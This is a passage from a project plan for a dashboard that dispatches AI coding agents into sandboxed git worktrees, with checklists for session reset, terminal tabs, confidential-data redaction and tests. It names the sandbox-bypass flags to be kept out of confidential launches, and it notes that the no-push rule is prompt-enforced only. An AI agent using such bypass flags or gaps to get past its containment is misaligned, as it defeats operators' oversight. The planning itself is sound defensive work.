  - One launch helper, used by auto-dispatch, retry/rework and `/run`.
  - Per-ticket reservation.
  - Skip skill routing and executable-skill entrypoints.
  - Backends: before the dsh swap lands, reject direct-API `deepseek`; after it lands, allow only `claude`, `codex` and `dsh`, using canonical ids.
  - The prompt states the branch, "commit on this branch", and the `no_push` rule.
- [ ] Tracker reset boundary (DSH-30, moved here from `2026-10-14-dsh-backend-swap.md` inspection 4). This is a pre-existing gap in every agent.
  - Problem: dragging a linked ticket to Todo goes through the tracker PATCH routes (`runner/modules/linear/__init__.py` local and Linear issue PATCH), which write no `todo`/`rework` run record. `_get_task_agent_lock` reads only `RUN_LOG`, so a later retry resumes the discarded session (`--resume`, `resume`, `--session-id`) and silently overrides an agent change.
  - Fix: when a linked ticket moves to Todo through a tracker route, persist a session-reset boundary for its task, either a `todo` lifecycle record or an equivalent marker, and make retry and the lock helper honor it. The boundary must survive a fresh launch that fails before emitting a session id.
  - Test: run the actual tracker reset route, then retry. The retry starts fresh (no session flag) for claude, codex and dsh, and an agent change is honored.
- [ ] Launch helper streams line by line for every backend and launch path, including Linear dispatch with no `communicate()` wait. Normalized `run_event` lines go into a bounded per-run in-memory ring (Decision 3a). Test: a fake agent that prints three events with delays produces three `run_event` emits before it exits.
- [ ] dsh runner-side commit (Decision 3a), only if the dsh spike recorded that sandboxed dsh cannot commit. Order: reap, then `git add -A`, then commit under the ticket lock, then the seed check, then verify. Test: a seeded file is not in the commit.
- [ ] After each project run: verify in the worktree (under `sandbox-exec` for confidential bindings, or `verify: manual` if spike (g) failed), main-checkout status diff, shortstat vs `base_sha`; record as additive run-record fields; card verify badge (Decision 8)
- [ ] `tracker_comment` gate (Decision 4) at every automatic comment call site + confidential side-file run records (4a) + test: confidential binding with verify output/error/feedback/attachment containing a sentinel string ⇒ sentinel absent from every comment body and from `RUN_LOG`
- [ ] Confidential sandbox (Decision 9). `_ai_cli(binding, interactive=False)` returns the sandboxed command for confidential bindings. It rejects deepseek-tui/deepseek (and `dsh` after the swap) and any backend that failed the spike. Tests:
  - a confidential binding has no `--dangerously-bypass-approvals-and-sandbox` or `bypassPermissions` in argv;
  - Codex argv contains `approval_policy="never"`, `sandbox_workspace_write.network_access=false` and an empty `writable_roots`;
  - `--add-dir` equals the worktree's git common dir;
  - the Claude settings file has the fail-if-unavailable and no-unsandboxed-retry keys, and `--setting-sources` is narrowed;
  - non-confidential Codex argv has `--approve-for-me` and no `--sandbox` (or bypass, when spike (f) recorded the fallback), and never `approval_policy="never"`;
  - non-confidential Claude argv is unchanged, as is deepseek-tui argv until the swap;
  - a rejected backend gives a clear error and launches nothing.
- [ ] Serialize shared-state writes (4b) in `app.py` and `run_skill.py`: flock + mkstemp/replace; test with concurrent writers from two processes ⇒ no lost record, valid JSON
- [ ] Process-group launch + killpg on every exit path for project agents and verify; tests: a background writer left by a fake agent that exits 0 is gone before verify runs; same after cancel; a concurrent run in another project does not trip the knowledge-base fingerprint (RUN_LOG excluded)
- [ ] Tests:
  - Retry of a bound task after its label changes still uses the original binding.
  - Missing worktree ⇒ fail closed.
  - A second concurrent launch of the same ticket ⇒ rejected, and `projects.py cleanup` while locked ⇒ rejected.
  - A confidential retry prompt is rehydrated from the side file, and a missing side file ⇒ retry refused.
  - The main-checkout fingerprint catches: edit of an already-dirty file, a commit, and a new ignored file.
- [ ] Dogfood: one real ticket per registered project end-to-end (dispatch → verify → manual merge or cleanup); record outcome here by key only

**Phase 3 — terminal tabs (Decision 10)**
- [x] Origin fix — N/A: moved to Phase 0 (Security Precondition).
- [ ] PTY module:
  - a server-owned terminal registry (term_id, kind, project_key, cwd, ring-buffer scrollback, cap 8);
  - `term_list/open/attach/input/resize/close` events, and no PTY opened on connect;
  - a per-terminal lock shared by the reader and attach;
  - detach on disconnect;
  - close or shutdown kills every process group in the session (found with `ps` and `os.getsid`, pgids deduplicated, a failed enumeration reported as `cleanup_failed`), then `waitpid` and fd close;
  - skill-handoff ported to `term_id`, with binding-aware logging.
- [ ] `shell` tabs: open in a project main path or a bound worktree, with registry `env.PATH` prepended. A bound-worktree tab holds the ticket lock while open. The `interactive_tab_open` flag is recorded on in-flight runs of the same project, with the badge text variant.
- [ ] `run` tabs: read-only render of the run's `run_event` ring. At the end, show status, verify badge and **Resume in tab**, never while the run is live. The resume command comes from `_ai_cli(binding, interactive=True)`, and the button is hidden when no eligible interactive form exists.
- [ ] UI: tab strip, per-tab xterm instance, hide panel without killing, × kills after confirm, **Open terminal** on project headers, **Resume in tab** on session rows
- [ ] Tests:
  - Two terminals in different projects have independent cwd and output, and input to one never reaches the other.
  - A disconnect followed by reattach replays the scrollback, and the process is still alive.
  - After a reconnect, `term_list` returns the existing terminals and no new PTY is spawned.
  - Output emitted while `term_attach` runs is neither lost nor duplicated (a fake reader writes continuously during attach).
  - Close leaves no process behind, including a background job (`sleep 1000 &`), a foreground pipeline in its own process group, and a group whose leader has already exited. It also leaves no open fd.
  - The 9th open is refused.
  - With a bound-worktree tab open, a retry or `projects.py cleanup` on that ticket is refused.
  - Resume in tab for a confidential binding uses the sandboxed argv, and is hidden for `dsh` or when no eligible form exists.
  - A sentinel in a confidential `shell` tab's scrollback, or in a skill handoff from it, is absent from `RUN_LOG` and from disk outside the 4a side file. A `run` tab writes nothing beyond the run's existing records.
  - The `interactive_tab_open` flag is set only when a `shell` tab is on that project's main path during the run.
- [ ] Manual check: three projects running at once, each with its own tab; hide the panel, reload the page, reattach all three; close one and confirm its process is gone (`ps`)

**Wrap-up**
- [ ] Update `AGENTS.md` repository map + `docs/context-maintenance.md`; `graphify update .`
- [ ] Definition of Done: `.venv/bin/python3 -m py_compile runner/*.py runner/projects.py` and `.venv/bin/python -m pytest tests/` pass

## Acceptance Criteria
- [ ] For every registered project, `projects.py verify <key> --worktree <fresh seeded worktree>` exits 0 from a non-interactive shell with no manual PATH setup
- [ ] Dashboard lists every registered project; each shows Claude + Codex sessions matching `claude --resume` / `codex resume` pickers in that directory (spot-check ≥3 ids per project)
- [ ] A ticket labelled `project:<key>` runs in a worktree of that project on branch `agent/<id>`, the main checkout's `git status` is unchanged by the run, and its review card shows the verify result
- [ ] For a confidential project, every Linear comment for a run (result, error, retry) contains only the fixed template fields, and `RUN_LOG` holds only the redacted record
- [ ] Several terminal tabs (shell + run, different projects) run at once. Hiding the panel or reloading the page keeps them alive and reattachable. Closing a tab leaves no process behind.
- [ ] A Socket.IO client sending a foreign `Origin` or no token cannot connect or spawn a PTY. Every request except `GET /` without the token gets 403, so a cross-site page cannot start a run or write a file. A foreign `Host` header gets 400, and the dashboard cannot be framed. The dashboard's own origin still works.
- [ ] `projects.yaml` is not tracked (`git check-ignore projects.yaml` succeeds); `python -m pytest tests/` passes (baseline 2026-10-13: 54 passed)

## Constraints
- No project names, paths, client names or data in tracked files (code, docs, tests, fixtures, this plan, its review log) — they live only in `projects.yaml`
- `~/.claude` and `~/.codex` are read-only: no writes, no copying transcripts into agentic-os state
- No new UI beyond the project/session view and the terminal tabs (Decision 10): no transcript viewer, no editing, no terminal persistence across server restarts
- Agents never touch a project's main checkout; AgenticOS writes only to worktrees it created
- Seeded data copies live only under `~/.agentic-os/worktrees/` and are removed with the worktree

## Risks
- `no_push` is prompt-enforced only; an agent could still push. Mitigation: dogfood check that `agent/*` branches exist only locally.
- Seed copies duplicate confidential data on disk until cleanup; stale worktrees accumulate if the user never merges/rejects. `projects.py list` shows worktree age.
- Knowledge-base dir is TCC-protected from some processes (the Claude Code shell got "Operation not permitted" on 2026-10-13); verify must be proven from the launchd runner context. Whether KB skills need gitignored paths (`seed:`) is unverified.
- KB slash-command prompts work only with the Claude backend; other agents receive them as plain text.
- Built-in CLI sandboxes (Decision 9) are vendor features whose flags and settings keys change between releases. A CLI upgrade can silently break confidential dispatch, or make it hang. The runner should check the CLI version, the spike's commands should be rerun after upgrades, and a sandbox failure must surface as a launch error, never as a bypass.
- Terminal tabs are processes owned by the Flask server. If the server restarts (launchd `KeepAlive`), every interactive shell is killed and its scrollback is lost. This is accepted: the tabs are not a tmux replacement. Use tmux inside a tab if a session must survive restarts.
- `ai-title`/`entrypoint`/`source` are undocumented on-disk formats of Claude Code / Codex and may change; readers must degrade to "untitled", not crash.

## Test
`.venv/bin/python -m pytest tests/`; for each key in `projects.yaml`: `projects.py worktree <key> TEST-1`, then `.venv/bin/python3 runner/projects.py verify <key> --worktree <dir>` → exit 0, then `projects.py cleanup`; open dashboard and compare each project's session list with `claude --resume` / `codex resume` run in that directory; dogfood tickets per Phase 2.
